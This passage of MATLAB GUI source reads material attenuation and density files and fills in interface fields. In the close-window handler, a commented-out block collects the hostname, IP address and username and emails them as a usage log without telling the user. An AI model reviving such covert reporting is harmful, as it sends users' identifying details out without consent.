    surf(SPHERE_RAD*xb+v(i,1), SPHERE_RAD*yb+v(i,2), SPHERE_RAD*zb+v(i,3), 'facecolor', 'black', 'edgealpha', 0);
    end
end

light;
lighting gouraud;

end
function T3_CreateFcn(hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function T1_CreateFcn(hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function T4_CreateFcn(hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function T2_CreateFcn(hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function edit14_CreateFcn(hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function edit15_CreateFcn(hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function edit16_CreateFcn(hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function thetaText_Callback (~, ~, ~)
function qtext_Callback     (~, ~, ~)
function transfere_CreateFcn(~, ~, ~)
function nda1_CreateFcn     (~, ~, ~)
function nda2_CreateFcn     (~, ~, ~)
function nda3_CreateFcn     (~, ~, ~)
function text12_CreateFcn   (~, ~, ~)
function setOFFeddits       (handles)
    set(handles.edit16,'String',8.04);
    set(handles.p1,'Visible','off');
    set(handles.p2,'Visible','off');
    set(handles.p3,'Visible','off');
    set(handles.p4,'Visible','off');
    set(handles.pp1,'Visible','on');
    set(handles.pp2,'Visible','on');
    set(handles.pp3,'Visible','on');
    set(handles.pp4,'Visible','on');
       
    set(handles.p12,'String','');
    set(handles.p22,'String','');
    set(handles.p32,'String','');
    set(handles.p42,'String','');
    set(handles.p11,'String','');
    set(handles.p21,'String','');
    set(handles.p31,'String','');
    set(handles.p41,'String','');
    
    set(handles.edit16,'BackgroundColor',[0.83 0.82 0.78]);
    set(handles.p12,'BackgroundColor'   ,[0.83 0.82 0.78]);
    set(handles.p22,'BackgroundColor'   ,[0.83 0.82 0.78]);
    set(handles.p32,'BackgroundColor'   ,[0.83 0.82 0.78]);
    set(handles.p42,'BackgroundColor'   ,[0.83 0.82 0.78]);
    set(handles.p11,'BackgroundColor'   ,[0.83 0.82 0.78]);
    set(handles.p21,'BackgroundColor'   ,[0.83 0.82 0.78]);
    set(handles.p31,'BackgroundColor'   ,[0.83 0.82 0.78]);
    set(handles.p41,'BackgroundColor'   ,[0.83 0.82 0.78]);    
function setONeddits        (handles)
    set(handles.p1,'Visible','on');
    set(handles.p2,'Visible','on');
    set(handles.p3,'Visible','on');
    set(handles.p4,'Visible','on');
    set(handles.p4,'Visible','on');
    set(handles.pp1,'Visible','off');
    set(handles.pp2,'Visible','off');
    set(handles.pp3,'Visible','off');
    set(handles.pp4,'Visible','off');
    
    set(handles.edit16,'String',8,'BackgroundColor','white');
    set(handles.p12,'String','','BackgroundColor','white');
    set(handles.p22,'String','','BackgroundColor','white');
    set(handles.p32,'String','','BackgroundColor','white');
    set(handles.p42,'String','','BackgroundColor','white');
    set(handles.p11,'String','','BackgroundColor','white');
    set(handles.p21,'String','','BackgroundColor','white');
    set(handles.p31,'String','','BackgroundColor','white');
    set(handles.p41,'String','','BackgroundColor','white');
    set(handles.p13,'String','','BackgroundColor','white');
    set(handles.p23,'String','','BackgroundColor','white');
    set(handles.p33,'String','','BackgroundColor','white');
    set(handles.p43,'String','','BackgroundColor','white');
    set(handles.aa, 'String','','BackgroundColor','white');
    set(handles.bb, 'String','','BackgroundColor','white');
    set(handles.hhh,'String','','BackgroundColor','white');
function atualiza(handles)

global caminhoDosArquivosDeTexto;
nomeDensidade = {'Air, Dry (near sea level)' 'Polyvinyl Chloride' 'Water, Liquid' 'Polylactic acid'};
cont =1;
valorEnergia = str2double(get(handles.edit16,'String'));

for x=1:4
           aux            =    strcat( nomeDensidade{x},'.txt');
           txtSelect      =    strcat(caminhoDosArquivosDeTexto,'AttCoefficients\',aux);
           txtDensidade   =    strcat(caminhoDosArquivosDeTexto,'densidades.txt');
           fid            =    fopen(txtSelect);
           tline          =    fgetl(fid);
                   j=0;
                   
                   
                   while ischar(tline)
                           convertePataFloat = strread(tline,'%f','delimiter','K');
                           j=j+1;
                           [tam, ~] =size(convertePataFloat);
                         if(tam>3)
                           dadosSelecionados(j,:) = convertePataFloat(2:4)';
                         else
                           dadosSelecionados(j,:) = convertePataFloat';
                         end
                           tline = fgetl(fid);
                    end
                    fclose(fid);
                    fid   = fopen(txtDensidade);
                    dadosSelecionados(:,1)= dadosSelecionados(:,1).*1000;
                    tline = fgetl(fid);
                    while ischar(tline)
                         
                         convertePataFloat  = textscan(tline,'%s %s','delimiter','|');
                         convertePataFloat2 = textscan(char(convertePataFloat{2}),'%f %f %f','delimiter','//');
                         densidade = convertePataFloat2{3};
                   
                         if(isequal(nomeDensidade{x},char(convertePataFloat{1})) && cont < 5);
                            if(cont==1) 
                            densidadeSelecionada=densidade;
                            set(handles.p12,'String',densidade);
                            set(handles.pp1,'String',nomeDensidade{x});
                            end
                            if(cont==2)
                                densidadeSelecionada=densidade;
                            set(handles.p22,'String',densidade);
                            set(handles.pp2,'String',nomeDensidade{x});
                            end
                            if(cont==3) 
                                densidadeSelecionada=densidade;
                            set(handles.p32,'String',densidade);
                            set(handles.pp3,'String',nomeDensidade{x});
                            end
                            if(cont==4) 
                                densidadeSelecionada=densidade;
                            set(handles.p42,'String',densidade);
                            set(handles.pp4,'String',nomeDensidade{x});
                            end
                         end
                    tline = fgetl(fid);
                    end
                    fclose(fid);
                    for i=1:size(dadosSelecionados)
                     if(isequal(round(dadosSelecionados(i,1)),round(valorEnergia)) && cont < 5)
                        if(cont==1)
                        miu=dadosSelecionados(i,2)*densidadeSelecionada;
                        set(handles.p11,'String',miu);
                        end
                        if(cont==2)
                        miu=dadosSelecionados(i,2)*densidadeSelecionada;
                        set(handles.p21,'String',miu);
                        end
                        if(cont==3)
                        miu=dadosSelecionados(i,2)*densidadeSelecionada;
                        set(handles.p31,'String',miu);
                        end
                        if(cont==4)
                        miu=dadosSelecionados(i,2)*densidadeSelecionada;
                        set(handles.p41,'String',miu);
                        end
                    end
                    end
                    cont = cont+1;
end  

    set(handles.p13,'String',20.00);
    set(handles.p23,'String',0.15E-3);
    set(handles.p33,'String',0.38);
    set(handles.p43,'String',0.2);
    set(handles.aa,'String',0.35);
    set(handles.bb ,'String',1.9);
    set(handles.hhh,'String',0.4);
    set(handles.p13,'BackgroundColor',[0.83 0.82 0.78]);
    set(handles.p23,'BackgroundColor',[0.83 0.82 0.78]);
    set(handles.p33,'BackgroundColor',[0.83 0.82 0.78]);
    set(handles.p43,'BackgroundColor',[0.83 0.82 0.78]);
    set(handles.aa,'BackgroundColor' ,[0.83 0.82 0.78]);
    set(handles.bb,'BackgroundColor' ,[0.83 0.82 0.78]);
    set(handles.hhh,'BackgroundColor',[0.83 0.82 0.78]);

%##############################################################################
% --- Executes when user attempts to close figure1.
function figure1_CloseRequestFcn(hObject, eventdata, handles)
global newData ...
       caminhoDosArquivosDeTexto ...
       m;
% d = dialog('Position',[400 400 250 150],'Name','Fechando ... ');
%  txt = uicontrol('Parent',d,...
%                'Style','text',...
%                'Position',[20 80 210 40],...
%                'String','Limpando buffers, auguarde o fechar do programa ...');
%            
% hostname = char( getHostName( java.net.InetAddress.getLocalHost ) );
% newData = [ {strcat('hostname >> [ ',hostname,' ]')}; get(handles.console,'Data')];
% set(handles.console,'Data',newData);
% ip = char( getHostAddress( java.net.InetAddress.getLocalHost ) );
% newData = [ {strcat('IP >> [ ',ip,' ]')} ; get(handles.console,'Data')];
% set(handles.console,'Data',newData);
% user = getenv('UserName');
% newData = [ {strcat('user >> [ ',user,' ]')} ;get(handles.console,'Data')];
% set(handles.console,'Data',newData);
% 
% new_data = strrep(datestr(datetime('now')), ':', '.');
% Ta       = strcat('logdata [',new_data,'].txt');
% writetable(cell2table(newData),Ta);
% 
% pause(0.05)
% caminhoLog =strcat(caminhoDosArquivosDeTexto,Ta);
% 
% try
%     sendmail(m,'MATLAB code utilization','O codigo do seu programa foi usado. Log em anexo:',{caminhoLog});  
% 
% catch exception
% close (d)
% delete(hObject);
% 
% end
% close (d)
% delete(hObject);



function negv_Callback(hObject, eventdata, handles)


% --- Executes on button press in Abbas.
function Abbas_Callback(hObject, eventdata, handles)
% hObject    handle to Abbas (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

% Hint: get(hObject,'Value') returns toggle state of Abbas
global tabgp;

espandis =  get(hObject,'Value');
if(espandis <1)
     set(tabgp,'Position',[0.58 .01 .4 0.90]);
else
     set(tabgp,'Position',[0.001 .03 .99 0.90]);
end

function detm_Callback(hObject, eventdata, handles)
 
function smoothPlot_Callback(hObject, eventdata, handles)
% hObject    handle to smoothPlot (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

% Hint: get(hObject,'Value') returns toggle state of smoothPlot



function iterarAte_Callback(hObject, eventdata, handles)
% hObject    handle to iterarAte (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

% Hints: get(hObject,'String') returns contents of iterarAte as text
%        str2double(get(hObject,'String')) returns contents of iterarAte as a double


% --- Executes during object creation, after setting all properties.
function iterarAte_CreateFcn(hObject, eventdata, handles)
% hObject    handle to iterarAte (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    empty - handles not created until after all CreateFcns called

% Hint: edit controls usually have a white background on Windows.
%       See ISPC and COMPUTER.
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end



function aAte_Callback(hObject, eventdata, handles)
% hObject    handle to aAte (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

% Hints: get(hObject,'String') returns contents of aAte as text
%        str2double(get(hObject,'String')) returns contents of aAte as a double


% --- Executes during object creation, after setting all properties.
function aAte_CreateFcn(hObject, eventdata, handles)
% hObject    handle to aAte (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    empty - handles not created until after all CreateFcns called

% Hint: edit controls usually have a white background on Windows.
%       See ISPC and COMPUTER.
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end


% --- Executes on button press in pushbutton24.
function pushbutton24_Callback(hObject, eventdata, handles)
% hObject    handle to pushbutton24 (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)


% --- Executes on button press in pushbutton25.
function pushbutton25_Callback(hObject, eventdata, handles)
% hObject    handle to pushbutton25 (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)


% --- Executes on button press in altr.
function altr_Callback(hObject, eventdata, handles)
% hObject    handle to altr (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

% Hint: get(hObject,'Value') returns toggle state of altr
usar=get(hObject,'Value');
if(usar>0)
set(handles.aAte,'String',100)
else
set(handles.aAte,'String',50)
end



function normalr_Callback(hObject, eventdata, handles)
% hObject    handle to normalr (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

% Hints: get(hObject,'String') returns contents of normalr as text
%        str2double(get(hObject,'String')) returns contents of normalr as a double


% --- Executes during object creation, after setting all properties.
function normalr_CreateFcn(hObject, eventdata, handles)
% hObject    handle to normalr (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    empty - handles not created until after all CreateFcns called

% Hint: edit controls usually have a white background on Windows.
%       See ISPC and COMPUTER.
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
